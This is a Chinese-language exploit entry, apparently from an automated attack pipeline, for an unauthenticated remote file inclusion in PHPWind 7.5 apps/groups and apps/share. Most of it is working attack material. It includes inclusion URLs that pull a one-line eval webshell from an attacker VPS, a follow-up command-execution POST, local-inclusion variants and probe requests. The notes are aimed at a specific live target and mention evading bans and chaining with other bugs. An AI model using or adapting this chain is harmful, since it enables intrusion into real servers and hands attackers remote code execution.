# PHPWind 7.5 apps/groups|share/example.com $route/$basePath 未初始化任意文件包含（前台零登录、可远程包含 getshell）

- **code**: phpwind-7.5-apps-groups-share-example.com-route-basepath-未初始化任意文件包含-前台零登录-可远程包含-ge
- **kind**: exp
- **category**: rce
- **component**: PHPWind
- **versions**: 7.5（含 7.5 SP3 实测可利用）；8.0/8.7 已修复，7.3.2 属更早分支需实测
- **severity**: critical
- **language**: http
- **source**: web
- **source_url**: https://blog.csdn.net/weixin_39912163/article/details/116077547
- **verified_note**: 未在目标实测（情报角色零请求）。**必须实测确认两个前提**：① 目标 7.3.2 的 apps/*/example.com 是否仍是「$route/$basePath 未初始化」的旧写法（8.7 同源源码已确认改为 $q + S::escapePath()，属修复后形态）；② 变量注入是否依赖 register_globals —— 目标 PHP 5.5.38 已移除 register_globals，若变量只能由 register_globals 注入则本条不可用。判据：直接请求带 basePath 的 URL，观察返回是否为被包含目标的原始内容。
- **path**: pocs/203.0.113.1-站群跳转机全机地图与负面情报-唯一动态程序-phpwind-7.3.2-全静态页-三套异机真入口/poc.http
- **created_at**: 2026-10-06T11:26:11.971Z
- **found_by**: exploit

## 描述

phpwind 7.5 的 apps/groups/example.com 与 apps/share/example.com 中，$route 与 $basePath 两个变量从未被赋值即用于 require_once：if($route=="share"){ require_once $basePath.'/action/m_share.php'; }。攻击者可控制这两个变量把 include 指向任意本地文件或远程 URL，从而执行任意 PHP 代码。发布者实测 PHPWind Forums v7.5 SP3 GBK 整合版利用成功，而 PHPWind 8.0 GBK build 20100810 无法利用 → 该漏洞在 7.x 分支存在、8.0 起修复。目标为 7.3.2 属受影响的老版本分支，但需实测确认写法与 register_globals 前提。

## 用法

```
【远程包含（需 allow_url_include=On）】
  在 VPS 放一个纯 PHP 大马，命名为 x.txt（必须 .txt 后缀，避免被当文件处理），内容如 <?php @eval($_POST[0]);?>
  GET https://TARGET/bbs/apps/groups/example.com?route=groups&basePath=http://<VPS_IP>/x.txt?
  GET https://TARGET/bbs/apps/share/example.com?route=share&basePath=http://<VPS_IP>/x.txt?
  **末尾的 ? 必须带**（原始 EXP 特别强调）：拼接后 URL 变成 http://<VPS>/x.txt?/action/m_groups.php，问号把 /action/... 变成 query，服务器直接回源 x.txt 内容。
  然后 POST 0=system('id');

【备选入口（apps.php 路由在 8.7 已被修复，但 7.x 值得一并试）】
  GET https://TARGET/bbs/apps.php?q=groups&route=groups&basePath=http://<VPS_IP>/x.txt?
  GET https://TARGET/bbs/apps.php?q=share&route=share&basePath=http://<VPS_IP>/x.txt?

【本地包含（无需 allow_url_include；需先有一个可上传的 php 落点）】
  GET /bbs/apps/groups/example.com?route=groups&basePath=../../upload
  GET /bbs/apps/groups/example.com?route=groups&basePath=./data/bbscache

【不依赖 VPS 的判定探测（省封禁额度，1 个包）】
  找一个站点上确定存在的 php 文件作为包含目标，看是否把它的**源码/输出**原样吐回：
  GET /bbs/apps/groups/example.com?route=groups&basePath=./data/bbscache
  若响应体出现目标文件内容（而非 phpwind 的「提示信息」页 / 146B 软 404）→ 变量可控，漏洞成立。

【环境前提检查（只能由利用侧黑盒判断）】
  · allow_url_include=On → 才能远程包含；目标已确认 allow_url_fopen=On，但 allow_url_include 未知，必须实测（这是本链能否一步到位的唯一变量）。
  · 若 allow_url_include=Off，则退为「本地包含」，需要一个先落下 .php/.txt 的写入点（可配合 bank_sort.php 那条链或附件上传）。

【修复侧证据（用于判断 7.3.2 是否仍可打）】
  PHPWind 8.7 同源源码 apps/groups/example.com 已被改成：
    if ($q == "groups") { require_once S::escapePath($appEntryBasePath . 'action/m_groups.php'); }
  且 apps.php 里 $appEntryBasePath 由 A_P.$appdir.'/' 硬编码拼装（app_specialRoute($q) 白名单），并有 S::escapePath 过滤 '://'、"\0"、'..'。
  → 攻击面在 8.7 已关闭；7.3.2 未采用该写法，属待验证的高价值目标。

【EXP 落盘】runs/pw-exp/apps-file-include-poc.txt
```

## 正文

```
### PHPWind 7.5 apps/*/example.com 任意文件包含 —— 原始 EXP (来自情Blog / CSDN)

# 发布下利用EXP
# http://www.######.***/apps/groups/example.com?route=groups&basePath=http://www.hackqing.cn/qing.txt?
# 浏览器访问
# http://www.######.***/apps/groups/example.com?route=groups&basePath=http://www.hackqing.cn/qing.txt?密码qing520
# 访问后就可以包含文件并获得webshell（问号要带上，不然会失败）
# qing.txt 保存 php 大马

### 源码（7.5，修复前形态）
# apps/share/example.com
if ($route == "share") {
    require_once $basePath . '/action/m_share.php';
} elseif ($route == "sharelink") {
    require_once $basePath . '/action/m_sharelink.php';
}
# apps/groups/example.com
if ($route == "groups") {
    require_once $basePath . '/action/m_groups.php';
} elseif ($route == "group") {
    require_once $basePath . '/action/m_group.php';
} elseif ($route == "galbum") {
    require_once $basePath . '/action/m_galbum.php';
}

### 对照：PHPWind 8.7 同源源码（修复后形态，攻击面已关闭）
# apps.php
$appdir = app_specialRoute($q);
if (!is_dir($appEntryBasePath = A_P . $appdir . '/')) Showmsg('undefined_action');
$appEntry = $appEntryBasePath . 'example.com';
require_once S::escapePath($appEntry);
# apps/groups/example.com
if ($q == "groups") { require_once S::escapePath($appEntryBasePath . 'action/m_groups.php'); }
# require/security.php  escapePath 过滤清单
$tmparray = array('://',"\0"); $ifCheck && $tmparray[] = '..';

### 目标侧探测请求（各 1 个包，先判变量可不可控再谈挂马）
GET /bbs/apps/groups/example.com?route=groups&basePath=./data/bbscache HTTP/1.1
GET /bbs/apps/share/example.com?route=share&basePath=./data/bbscache HTTP/1.1
GET /bbs/apps.php?q=groups&route=groups&basePath=./data/bbscache HTTP/1.1

### 远程包含 EXP（需 allow_url_include=On）
# VPS: /var/www/html/x.txt  ->  <?php @eval($_POST[0]);?>
GET /bbs/apps/groups/example.com?route=groups&basePath=http://VPS_IP/x.txt? HTTP/1.1
# 注意末尾 '?' 不可省

```
